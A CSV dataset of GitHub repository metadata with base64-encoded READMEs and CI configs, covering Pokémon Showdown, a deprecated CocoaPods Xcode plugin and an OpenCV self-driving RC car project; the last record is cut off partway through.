name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
bmFtZSBtdXN0IGJlIHJlZ2lzdGVyZWQuIElmIHlvdSBkbyBub3QgaGF2ZSBh
IHJlZ2lzdGVyZWQgYWNjb3VudCwgeW91IGNhbiBjcmVhdGUgb25lIHVzaW5n
IHRoZSBSZWdpc3RlciBidXR0b24gaW4gdGhlIHNldHRpbmdzIG1lbnUgKGl0
IGxvb2tzIGxpa2UgYSBnZWFyKSBpbiB0aGUgdXBwZXItcmlnaHQgb2YgUG9r
w6ltb24gU2hvd2Rvd24uCgpPbmNlIHlvdSdyZSBhbiBhZG1pbmlzdHJhdG9y
LCB5b3UgY2FuIHByb21vdGUvZGVtb3RlIG90aGVycyBlYXNpbHkgd2l0aCB0
aGUgYC9nbG9iYWxhZG1pbmAsIGAvZ2xvYmFsbGVhZGVyYCwgYC9nbG9iYWxt
b2RgLCBldGMgY29tbWFuZHMuCgoKQnJvd3NlciBzdXBwb3J0Ci0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLQoKUG9rw6ltb24gU2hvd2Rvd24gY3VycmVu
dGx5IHN1cHBvcnRzLCBpbiBvcmRlciBvZiBwcmVmZXJlbmNlOgoKIC0gQ2hy
b21lCiAtIEZpcmVmb3gKIC0gT3BlcmEKIC0gU2FmYXJpIDUrCiAtIElFMTEr
CiAtIENocm9tZS9GaXJlZm94L1NhZmFyaSBmb3IgdmFyaW91cyBtb2JpbGUg
ZGV2aWNlcwoKUG9rw6ltb24gU2hvd2Rvd24gaXMgdXNhYmxlLCBidXQgZXhw
ZWN0IGRlZ3JhZGVkIHBlcmZvcm1hbmNlIGFuZCBjZXJ0YWluIGZlYXR1cmVz
IG5vdCB0byB3b3JrIGluOgoKIC0gU2FmYXJpIDQrCiAtIElFOSsKClBva8Op
bW9uIFNob3dkb3duIGlzIG1vc3RseSBkZXZlbG9wZWQgb24gQ2hyb21lLCBh
bmQgQ2hyb21lIG9yIHRoZSBkZXNrdG9wIGNsaWVudCBpcyByZXF1aXJlZCBm
b3IgY2VydGFpbiBmZWF0dXJlcyBsaWtlIGRyYWdnaW5nLWFuZC1kcm9wcGlu
ZyB0ZWFtcyBmcm9tIFBTIHRvIHlvdXIgY29tcHV0ZXIuIEhvd2V2ZXIsIGJ1
Z3MgcmVwb3J0ZWQgb24gYW55IHN1cHBvcnRlZCBicm93c2VyIHdpbGwgdXN1
YWxseSBiZSBmaXhlZCBwcmV0dHkgcXVpY2tseS4KCgpDb21tdW5pdHkKLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgpQUyBoYXMgYSBidWlsdC1pbiBj
aGF0IHNlcnZpY2UuIEpvaW4gb3VyIG1haW4gc2VydmVyIHRvIHRhbGsgdG8g
dXMhCgpZb3UgY2FuIGFsc28gdmlzaXQgdGhlIFtQb2vDqW1vbiBTaG93ZG93
biBmb3J1bXNdWzhdIGZvciBkaXNjdXNzaW9uIGFuZCBoZWxwLgoKICBbOF06
IGh0dHBzOi8vd3d3LnNtb2dvbi5jb20vZm9ydW1zL2ZvcnVtcy9wb2slQzMl
QTltb24tc2hvd2Rvd24uMjA5LwoKSWYgeW91J2QgbGlrZSB0byBjb250cmli
dXRlIHRvIHByb2dyYW1taW5nIGFuZCBkb24ndCBrbm93IHdoZXJlIHRvIHN0
YXJ0LCBmZWVsIGZyZWUgdG8gY2hlY2sgb3V0IFtJZGVhcyBmb3IgTmV3IERl
dmVsb3BlcnNdWzldLgoKICBbOV06IGh0dHBzOi8vZ2l0aHViLmNvbS9aYXJl
bC9Qb2tlbW9uLVNob3dkb3duL2lzc3Vlcy8yNDQ0CgoKTGljZW5zZQotLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KClBva8OpbW9uIFNob3dkb3duJ3Mg
c2VydmVyIGlzIGRpc3RyaWJ1dGVkIHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUg
W01JVCBMaWNlbnNlXVsxMF0uCgogIFsxMF06IGh0dHBzOi8vZ2l0aHViLmNv
bS9aYXJlbC9Qb2tlbW9uLVNob3dkb3duL2Jsb2IvbWFzdGVyL0xJQ0VOU0UK
CgpDcmVkaXRzCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoKT3duZXIK
Ci0gR3Vhbmdjb25nIEx1byBbWmFyZWxdIC0gRGV2ZWxvcG1lbnQsIERlc2ln
biwgU3lzYWRtaW4KClN0YWZmCgotIEFzdHJpZCBIYWxiZXJrYW1wIFtBc2hl
dmllcmUsIGJ1bWJhZGFkYWJ1bV0gLSBEZXZlbG9wbWVudAotIENocmlzIE1v
bnNhbnRvIFtjaGFvc10gLSBTeXNhZG1pbgotIEtpcmsgU2NoZWliZWxodXQg
W3ByZV0gLSBEZXZlbG9wbWVudCwgU3lzYWRtaW4KLSBNYXRoaWV1IERpYXMt
TWFydGlucyBbTWFydHktRF0gLSBSZXNlYXJjaCAoZ2FtZSBtZWNoYW5pY3Mp
LCBEZXZlbG9wbWVudAotIFtUaGUgSW1tb3J0YWxdIC0gRGV2ZWxvcG1lbnQK
ClJldGlyZWQgU3RhZmYKCi0gQmlsbCBNZWx0c25lciBbYm1lbHRzXSAtIERl
dmVsb3BtZW50LCBTeXNhZG1pbgotIENhdGh5IEouIEZpdHpwYXRyaWNrIFtj
YXRoeWpmXSAtIERldmVsb3BtZW50LCBTeXNhZG1pbgotIEh1Z2ggR29yZG9u
IFtWNF0gLSBSZXNlYXJjaCAoZ2FtZSBtZWNoYW5pY3MpLCBEZXZlbG9wbWVu
dAotIEp1YW5tYSBTZXJyYW5vIFtKb2ltXSAtIERldmVsb3BtZW50LCBTeXNh
ZG1pbgotIExlb25hcmRvIEp1bGNhIFtTbGF5ZXI5NV0gLSBEZXZlbG9wbWVu
dAoKTWFqb3IgQ29udHJpYnV0b3JzCgotIEFuZHJldyBXZXJuZXIgW0hvZWVu
SGVyb10gLSBEZXZlbG9wbWVudAotIEF1c3RpbiBDb3V0dXJpZXIgW0F1c3Rp
bl0gLSBEZXZlbG9wbWVudCAoZGFtYWdlIGNhbGN1bGF0b3IpCi0gS2V2aW4g
TGF1IFtBc2NyaXB0bWFzdGVyXSAtIERldmVsb3BtZW50LCBBcnQgKGJhdHRs
ZSBhbmltYXRpb25zKQotIEtvbnJhZCBCb3Jvd3NraSBbeGZpeF0gLSBEZXZl
bG9wbWVudAotIExlb25hcmQgQ3JhZnQgSUlJIFtEYVdvYmxlZmV0XSAtIFJl
c2VhcmNoIChnYW1lIG1lY2hhbmljcykKLSBOZWlsIFJhc2hicm9vayBbdXJr
ZXJhYl0gLSBEZXZlbG9wbWVudAotIFtwZWFjaF0gLSBEZXZlbG9wbWVudAot
IFF1aW50b24gTGVlIFtzaXJEb25vdmFuXSAtIERldmVsb3BtZW50Ci0gW1Jp
ZGF6XSAtIEFydCAoYmF0dGxlIGFuaW1hdGlvbnMpCi0gUm9iaW4gVmFuZGVu
YnJhbmRlIFtRdWluZWxsYV0gLSBEZXZlbG9wbWVudAotIFRvYmlhcyBNYW5u
IFthc2dkZl0gLSBEZXZlbG9wbWVudAotIFdpbGxpYW0gW01hY0NoYWVnZXJd
IC0gRGV2ZWxvcG1lbnQKCkNvbnRyaWJ1dG9ycwoKLSBBbGV4YW5kZXIgQi4g
W21hdGhmcmVhazIzMV0gLSBEZXZlbG9wbWVudAotIEFuZHJldyBHb29kc2Vs
bCBbWnJhY2tuZWxdIC0gQXJ0IChiYXR0bGUgd2VhdGhlciBiYWNrZHJvcHMp
Ci0gQXZlcnkgWmltbWVyIFtMeXJlbiwgU29sYXJpc0ZveF0gLSBEZXZlbG9w
bWVudAotIEJlbiBEYXZpZXMgW01vcmZlbnRdIC0gRGV2ZWxvcG1lbnQKLSBC
ZW4gRnJlbmdsZXkgW1RhbGtUYWtlc1RpbWVdIC0gRGV2ZWxvcG1lbnQKLSBD
b2R5IFRob21wc29uIFtSaXNpbmdfRHVza10gLSBEZXZlbG9wbWVudAotIFtI
b25rb10gLSBEZXZlbG9wbWVudCAoZGFtYWdlIGNhbGN1bGF0b3IpCi0gSWFu
IENsYWlsIFtMYXllbGxdIC0gQXJ0IChiYXR0bGUgZ3JhcGhpY3MsIHNwcml0
ZXMpCi0gSmFjb2IgTWNMZW1vcmUgW01jTGVtb3JlXSAtIERldmVsb3BtZW50
Ci0gSmVyZW15IFBpZW1vbnRlIFtwYW5wYXduXSAtIERldmVsb3BtZW50Ci0g
S3JpcyBKb2huc29uIFtLcmlzXSAtIERldmVsb3BtZW50Ci0gTHVrZSBIYXJt
b24tVmVsbG90dGkgW21vbywgQ2hlZXNlTXVmZmluXSAtIERldmVsb3BtZW50
Ci0gUnVzc2VsbCBKb25lcyBbU2FkaXN0aWNNeXN0aWNdIC0gUmVzZWFyY2gg
KGdhbWUgbWVjaGFuaWNzKQotIFNwYW5kYW4gUHVud2F0a2FyIFtzcGFuZGFu
XS0gRGV2ZWxvcG1lbnQKLSBXYWxlZWQgSGFzc2FuIFtqZXRvdV0gLSBEZXZl
bG9wbWVudAoKU3BlY2lhbCB0aGFua3MKCi0gU2VlIGh0dHA6Ly9wb2tlbW9u
c2hvd2Rvd24uY29tL2NyZWRpdHMK
",,"c3VkbzogZmFsc2UKbGFuZ3VhZ2U6IG5vZGVfanMKbm9kZV9qczoKICAtICcx
MCcKY2FjaGU6CiAgZGlyZWN0b3JpZXM6CiAgICAtIG5vZGVfbW9kdWxlcwog
ICAgLSAuZXNsaW50Y2FjaGUKc2NyaXB0OiBucG0gcnVuIGZ1bGx0ZXN0Cg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'cocoapods-xcode-plugin',11271755,"b'[deprecated] Dependency management helper for your CocoaPods, right in Xcode 6 and 7'",b'Objective-C',14,2377,,2377,False,b'https://api.github.com/repos/kattrali/cocoapods-xcode-plugin/forks',"IyBDb2NvYVBvZHMgZm9yIFhjb2RlCgohW3Byb2plY3QgZGVwcmVjYXRlZF0o
aHR0cHM6Ly9pbWcuc2hpZWxkcy5pby9iYWRnZS9wcm9qZWN0JTIwc3RhdHVz
LWRlcHJlY2F0ZWQtcmVkLnN2ZykKClRoaXMgcHJvamVjdCBpcyBkZXByZWNh
dGVkIGluIGZhdm9yIG9mIFtFZGl0b3IgRXh0ZW5zaW9uc10oaHR0cHM6Ly9k
ZXZlbG9wZXIuYXBwbGUuY29tL3ZpZGVvcy9wbGF5L3d3ZGMyMDE2LzQxNC8p
IHN1cHBvcnQgaW4gWGNvZGUgOCsuCgpNYW5hZ2UgeW91ciBkZXBlbmRlbmNp
ZXMsIHdpdGggbWluaW1hbCBjb21tYW5kIGxpbmUgaGFjay1mdS4KCiMjIEZl
YXR1cmVzCgotIERvd25sb2FkcyBhbmQgaW50ZWdyYXRlcyBDb2NvYVBvZHMg
bGlzdGVkIGluIGEgcHJvamVjdCdzIFBvZGZpbGUKLSBDcmVhdGVzIHBvZHNw
ZWNzIGZyb20gYSB0ZW1wbGF0ZQotIFNob3dzIGNvbW1hbmQgb3V0cHV0IGlu
IHRoZSB3aW5kb3cgY29uc29sZQotIEluc3RhbGxzIGRvY3VtZW50YXRpb24g
KGZyb20gQ29jb2FEb2NzKSBmb3IgdGhlIENvY29hUG9kcyB1c2VkIGluIHRo
ZSBvcGVuIFhjb2RlIHdvcmtzcGFjZQotIFN1cHBvcnRzIHVzaW5nIGEgY3Vz
dG9tIHBhdGggdG8geW91ciBDb2NvYVBvZHMgaW5zdGFsbGF0aW9uCi0gU3Vw
cG9ydHMgYCRHRU1fSE9NRWAgZXhwYW5zaW9uLCBgJEdFTV9QQVRIYCBleHBh
bnNpb24sIGFuZCBgcnZtYCBlbnZpcm9ubWVudHMKLSBPZmZsaW5lIG1vZGUK
CiFbTWVudV0obWVudS5wbmcpCgoKIyMgUHJlcmVxdWlzaXRlcwoKLSBYY29k
ZSA1KwotIENvY29hUG9kcyAwLjIyLjErLCBieSBkZWZhdWx0IGV4cGVjdGVk
IHRvIGJlIGluc3RhbGxlZCB0byBgL3Vzci9iaW4vcG9kYC4gVGhlIGluc3Rh
bGxhdGlvbiBwYXRoIGNhbiBiZSBjaGFuZ2VkIGJ5IGVkaXRpbmcgYEdFTSBQ
QVRIYCBpbiB0aGUgYFByb2R1Y3QgPiBDb2NvYVBvZHNgIG1lbnUuIE1vcmUg
ZGV0YWlscyBjYW4gYmUgZm91bmQgaW4gdGhlIFVzYWdlIHNlY3Rpb24uCgoK
IyMgSW5zdGFsbAoKSW5zdGFsbCB2aWEgW0FsY2F0cmF6XShodHRwOi8vYWxj
YXRyYXouaW8vKQoKT1IKCkNsb25lIGFuZCBidWlsZCB0aGUgcHJvamVjdCwg
dGhlbiByZXN0YXJ0IFhjb2RlLgoKIyMgVW5pbnN0YWxsCgpVbmluc3RhbGwg
dmlhIFtBbGNhdHJhel0oaHR0cDovL2FsY2F0cmF6LmlvLykKCk9SCgpSdW4g
YHJtIC1yIH4vTGlicmFyeS9BcHBsaWNhdGlvblwgU3VwcG9ydC9EZXZlbG9w
ZXIvU2hhcmVkL1hjb2RlL1BsdWctaW5zL0NvY29hUG9kcy54Y3BsdWdpbi9g
CgojIyBVc2FnZQoKIyMjIE9mZmxpbmUgbW9kZQoKSW4gc29tZSBzaXR1YXRp
b25zLCBzdWNoIGFzIHdvcmtpbmcgdW5kZXIgcG9vciBuZXR3b3JrIGNvbmRp
dGlvbnMsIHlvdSBtYXkgd2FudCB0byBydW4gYHBvZGAgaW4Kb2ZmbGluZSBt
b2RlLiBUb2dnbGUgYFByb2R1Y3QgPiBDb2NvYVBvZHMgPiBVcGRhdGUgYW5k
IEluc3RhbGwgT2ZmbGluZSBPbmx5YCB0byBlbmFibGUgb2ZmbGluZSBtb2Rl
LgoKIyMjIEN1c3RvbSBHRU1fUEFUSCBzZXR0aW5nCgpZb3UgY2FuIHNwZWNp
ZnkgYSBjdXN0b20gR0VNX1BBVEggaW4gdGhlIGBQcm9kdWN0ID4gQ29jb2Fw
b2RzYCBtZW51LiBUaGUgZGVmYXVsdCBpcyBgL3Vzci9iaW5gIGFuZCByZW1v
dmluZyBhIGN1c3RvbSB2YWx1ZSB3aWxsIHJlc3RvcmUgdGhlIGRlZmF1bHQu
IEJvdGggYCRHRU1fSE9NRWAgYW5kIGAkR0VNX1BBVEhgIGFyZSBzdXBwb3J0
ZWQsIGFsb25nIHdpdGggYHJ2bWAgZW52aXJvbm1lbnRzLiBUaGF0IG1lYW5z
IHRoZSBmb2xsb3dpbmcgc2V0dGluZ3MgYXJlIHZhbGlkOgoKYGBgCiAgL3Vz
ci9iaW4KICAvdXNyL2xvY2FsL2JpbgogICRHRU1fSE9NRS9iaW4KICAke0dF
TV9IT01FfS9iaW4KICAkR0VNX1BBVEgvYmluCiAgJHtHRU1fUEFUSH0vYmlu
CiAgL1NPTUVfUEFSRU5ULyRHRU1fSE9NRS9iaW4KICAvU09NRV9QQVJFTlQv
JEdFTV9QQVRIL2JpbgpgYGAKCldoZW4gc3BlY2lmeWluZyBgJEdFTV9QQVRI
YCBlYWNoIHBhdGggY29tcG9uZW50IHdpbGwgYmUgZXhwYW5kZWQgZHVyaW5n
IGNvbW1hbmQgcmVzb2x1dGlvbi4gVGhhdCBtZWFucyB0aGUgZm9sbG93aW5n
OgoKYGBgCiAgJEdFTV9QQVRIL2JpbgogIGV4cGFuZHMgdG8uLi4KICAvVXNl
cnMvamFwcGxlc2VlZC8ucnZtL2dlbXMvcnVieS0yLjAuMC1wMjQ3QG15X2dl
bXNldDovVXNlcnMvamFwcGxlc2VlZC8ucnZtL2dlbXMvcnVieS0yLjAuMC1w
MjQ3QGdsb2JhbAogIGV4cGFuZHMgdG8uLi4KICAvVXNlcnMvamFwcGxlc2Vl
ZC8ucnZtL2dlbXMvcnVieS0yLjAuMC1wMjQ3QG15X2dlbXNldC9iaW46L1Vz
ZXJzL2phcHBsZXNlZWQvLnJ2bS9nZW1zL3J1YnktMi4wLjAtcDI0N0BnbG9i
YWwvYmluCmBgYAoKRHVyaW5nIGNvbW1hbmQgcmVzb2x1dGlvbiwgZWFjaCBw
YXRoIHdpbGwgYmUgdGVzdGVkIChpbiBvcmRlcikgc28gdGhhdCB0aGUgZmly
c3QgbWF0Y2ggaXMgdXNlZC4KClBhdGggZXhwYW5zaW9uIGFuZCBjb21tYW5k
IHJlc29sdXRpb24gb2NjdXJzIGVhY2ggdGltZSBiZWZvcmUgYSBjb21tYW5k
IGlzIHJ1bi4gRm9yIGFuIGBydm1gIGVudmlyb25tZW50LCBgLnJ1YnktdmVy
c2lvbmAgYW5kIGAucnVieS1nZW1zZXRgIChpbiB0aGUgcm9vdCBwcm9qZWN0
IGRpcmVjdG9yeSkgY2FuIGR5bmFtaWNhbGx5IGFsdGVyIHRoZSBlbnZpcm9u
bWVudCBhbmQgQ29jb2Fwb2RzIHN1cHBvcnRzIHRoaXMgYmVoYXZpb3IuCgoj
IyMjIFVzaW5nIEdFTV9QQVRIIHdpdGggcnZtCgpVbmRlciBtb3N0IGNpcmN1
bXN0YW5jZXMgaW4gYW4gYHJ2bWAgZW52aXJvbm1lbnQgdGhlIGZvbGxvd2lu
ZyBjdXN0b20gYEdFTV9QQVRIYCBzZXR0aW5nIHNob3VsZCBiZSB1c2VkOgoK
IVtTdWl0YWJsZSBydm0gc2V0dGluZ10obWVudV9ydm0ucG5nKQoKTk9URTog
QmVoaW5kIHRoZSBzY2VuZXMsIHRoZSBgL2JpbmAgcGF0aCBlbGVtZW50IHdp
bGwgYmUgY29udmVydGVkIHRvIGAvd3JhcHBlcmAgZm9yIHJ2bS4gSWYgYC5y
dm1gIGlzIG5vdCBmb3VuZCBpbiB0aGUgZXhwYW5kZWQgcGF0aCwgdGhlIGAv
YmluYCBwYXRoIGVsZW1lbnQgd2lsbCByZW1haW4gdW5tb2RpZmllZC4KCiMj
IFtDb250cmlidXRvcnNdKGh0dHBzOi8vZ2l0aHViLmNvbS9rYXR0cmFsaS9j
b2NvYXBvZHMteGNvZGUtcGx1Z2luL2dyYXBocy9jb250cmlidXRvcnMpCgoj
IyBMaWNlbnNlCgoqKmNvY29hcG9kcy14Y29kZS1wbHVnaW4qKiBpcyBbbGlj
ZW5zZWQgdW5kZXIgdGhlIE1JVCBvcGVuIHNvdXJjZSBsaWNlbnNlXShodHRw
czovL2dpdGh1Yi5jb20va2F0dHJhbGkvY29jb2Fwb2RzLXhjb2RlLXBsdWdp
bi9ibG9iL21hc3Rlci9MSUNFTlNFKS4K
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'AutoRCCar',38638440,b'OpenCV Python Neural Network Autonomous RC Car',b'Python',36,2377,,2377,False,b'https://api.github.com/repos/hamuchiwa/AutoRCCar/forks',"IyMgQXV0b1JDQ2FyCiMjIyBQeXRob24zICsgT3BlbkNWMwoKU2VlIHNlbGYt
ZHJpdmluZyBpbiBhY3Rpb24gIAoKPGEgaHJlZj0iaHR0cDovL3d3dy55b3V0
dWJlLmNvbS93YXRjaD9mZWF0dXJlPXBsYXllcl9lbWJlZGRlZCZ2PUJCd0VG
NldCVVFzCiIgdGFyZ2V0PSJfYmxhbmsiPjxpbWcgc3JjPSJodHRwOi8vaW1n
LnlvdXR1YmUuY29tL3ZpL0JCd0VGNldCVVFzLzAuanBnIiB3aWR0aD0iMzYw
IiBoZWlnaHQ9IjI0MCIgYm9yZGVyPSIxMCIgLz48L2E+CgpUaGlzIHByb2pl
Y3QgYnVpbGRzIGEgc2VsZi1kcml2aW5nIFJDIGNhciB1c2luZyBSYXNwYmVy
cnkgUGksIEFyZHVpbm8gYW5kIG9wZW4gc291cmNlIHNvZnR3YXJlLiBSYXNw
YmVycnkgUGkgY29sbGVjdHMgaW5wdXRzIGZyb20gYSBjYW1lcmEgbW9kdWxl
IGFuZCBhbiB1bHRyYXNvbmljIHNlbnNvciwgYW5kIHNlbmRzIGRhdGEgdG8g
YSBjb21wdXRlciB3aXJlbGVzc2x5LiBUaGUgY29tcHV0ZXIgcHJvY2Vzc2Vz
IGlucHV0IGltYWdlcyBhbmQgc2Vuc29yIGRhdGEgZm9yIG9iamVjdCBkZXRl
Y3Rpb24gKHN0b3Agc2lnbiBhbmQgdHJhZmZpYyBsaWdodCkgYW5kIGNvbGxp
c2lvbiBhdm9pZGFuY2UgcmVzcGVjdGl2ZWx5LiBBIG5ldXJhbCBuZXR3b3Jr
IG1vZGVsIHJ1bnMgb24gY29tcHV0ZXIgYW5kIG1ha2VzIHByZWRpY3Rpb25z
IGZvciBzdGVlcmluZyBiYXNlZCBvbiBpbnB1dCBpbWFnZXMuIFByZWRpY3Rp
b25zIGFyZSB0aGVuIHNlbnQgdG8gdGhlIEFyZHVpbm8gZm9yIFJDIGNhciBj
b250cm9sLiAKICAKIyMjIFNldHRpbmcgdXAgZW52aXJvbm1lbnQgd2l0aCBB
bmFjb25kYQogIDEuIEluc3RhbGwgW2BtaW5pY29uZGEoUHl0aG9uMylgXSho
dHRwczovL2NvbmRhLmlvL21pbmljb25kYS5odG1sKSBvbiB5b3VyIGNvbXB1
dGVyCiAgMi4gQ3JlYXRlIGBhdXRvLXJjY2FyYCBlbnZpcm9ubWVudCB3aXRo
IGFsbCBuZWNlc3NhcnkgbGlicmFyaWVzIGZvciB0aGlzIHByb2plY3QgIAog
ICAgIGBgYGNvbmRhIGVudiBjcmVhdGUgLWYgZW52aXJvbm1lbnQueW1sYGBg
CiAgICAgCiAgMy4gQWN0aXZhdGUgYGF1dG8tcmNjYXJgIGVudmlyb25tZW50
ICAKICAgICBgYGBzb3VyY2UgYWN0aXZhdGUgYXV0by1yY2NhcmBgYAogIAog
ICZlbnNwOyBUbyBleGl0LCBzaW1wbHkgY2xvc2UgdGhlIHRlcm1pbmFsIHdp
bmRvdy4gTW9yZSBpbmZvIGFib3V0IG1hbmFnaW5nIEFuYWNvbmRhIGVudmly
b25tZW50LCBwbGVhc2Ugc2VlIFtoZXJlXShodHRwczovL2NvbmRhLmlvL2Rv
Y3MvdXNlci1ndWlkZS90YXNrcy9tYW5hZ2UtZW52aXJvbm1lbnRzLmh0bWwp
LgogIAojIyMgQWJvdXQgdGhlIGZpbGVzCioqdGVzdC8qKiAgCiAgJmVtc3A7
ICZlbXNwOyBgcmNfY29udHJvbF90ZXN0LnB5YDogUkMgY2FyIGNvbnRyb2wg
d2l0aCBrZXlib2FyZCAgCiAgJmVtc3A7ICZlbXNwOyAgYHN0cmVhbV9zZXJ2
ZXJfdGVzdC5weWA6IHZpZGVvIHN0cmVhbWluZyBmcm9tIFBpIHRvIGNvbXB1
dGVyICAKICAmZW1zcDsgJmVtc3A7ICBgdWx0cmFzb25pY19zZXJ2ZXJfdGVz
dC5weWA6IHNlbnNvciBkYXRhIHN0cmVhbWluZyBmcm9tIFBpIHRvIGNvbXB1
dGVyICAKICAmZW1zcDsgJmVtc3A7ICAqKm1vZGVsX3RyYWluX3Rlc3QvKiog
IAogICAgICAmZW1zcDsgJmVtc3A7ICAmZW1zcDsgJmVtc3A7IGBkYXRhX3Rl
c3QubnB6YDogc2FtcGxlIGRhdGEgIAogICAgICAmZW1zcDsgJmVtc3A7ICAm
ZW1zcDsgJmVtc3A7IGB0cmFpbl9wcmVkaWN0X3Rlc3QuaXB5bmJgOiBhIGp1
cHl0ZXIgbm90ZWJvb2sgdGhhdCBnb2VzIHRocm91Z2ggbmV1cmFsIG5ldHdv
cmsgbW9kZWwgaW4gT3BlbkNWMyAgCiAgCioqcmFzcGJlcnJ5UGkvKiogICAg
CiAgJmVtc3A7ICZlbXNwOyAgYHN0cmVhbV9jbGllbnQucHlgOiAgICAgICAg
c3RyZWFtIHZpZGVvIGZyYW1lcyBpbiBqcGVnIGZvcm1hdCB0byB0aGUgaG9z
dCBjb21wdXRlciAgCiAgJmVtc3A7ICZlbXNwOyAgYHVsdHJhc29uaWNfY2xp
ZW50LnB5YDogICAgc2VuZCBkaXN0YW5jZSBkYXRhIG1lYXN1cmVkIGJ5IHNl
bnNvciB0byB0aGUgaG9zdCBjb21wdXRlciAgCiAgCioqYXJkdWluby8qKiAg
CiAgJmVtc3A7ICZlbXNwOyAgYHJjX2tleWJvYXJkX2NvbnRyb2wuaW5vYDog
Y29udHJvbCBSQyBjYXIgY29udHJvbGxlciAgCiAgCioqY29tcHV0ZXIvKiog
ICAgCiAgJmVtc3A7ICZlbXNwOyAgKipjYXNjYWRlX3htbC8qKiAgCiAgICAg
ICZlbXNwOyAmZW1zcDsgICZlbXNwOyAmZW1zcDsgIHRyYWluZWQgY2FzY2Fk
ZSBjbGFzc2lmaWVycyAgCiAgJmVtc3A7ICZlbXNwOyAgKipjaGVzc19ib2Fy
ZC8qKiAgIAogICAgICAmZW1zcDsgJmVtc3A7ICAmZW1zcDsgJmVtc3A7ICBp
bWFnZXMgZm9yIGNhbGlicmF0aW9uLCBjYXB0dXJlZCBieSBwaSBjYW1lcmEg
IAogICAgICAKICAmZW1zcDsgJmVtc3A7ICBgcGljYW1fY2FsaWJyYXRpb24u
cHlgOiAgICAgcGkgY2FtZXJhIGNhbGlicmF0aW9uICAKICAmZW1zcDsgJmVt
c3A7ICBgY29sbGVjdF90cmFpbmluZ19kYXRhLnB5YDogY29sbGVjdCBpbWFn
ZXMgaW4gZ3JheXNjYWxlLCBkYXRhIHNhdmVkIGFzIGAqLm5wemAgIAogICZl
